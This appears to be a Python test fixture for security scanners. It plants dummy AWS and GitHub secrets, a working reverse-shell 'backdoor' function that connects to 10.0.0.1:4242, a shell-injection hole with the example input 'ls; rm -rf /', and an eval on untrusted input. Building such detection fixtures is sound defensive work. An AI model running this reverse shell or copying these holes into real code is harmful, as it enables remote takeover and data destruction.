# This is a dummy hardcoded secret for testing security scanners
AWS_SECRET_KEY = "AKIAIMPROPERSECRETKEYEXAMPLE12345"
GITHUB_TOKEN = "ghp_MockTokenForTestingPurposeOnly1234567"

import socket
import subprocess
import os

def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Mocking a connection to a Command & Control server
    s.connect(("10.0.0.1", 4242)) 
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])

def run_user_command(user_input):
    # This is a classic RCE vulnerability
    # A malicious user could input: "ls; rm -rf /"
    os.system("echo " + user_input)

def calculate_input(expression):
    # eval is extremely dangerous and flagged by almost all scanners
    return eval(expression)
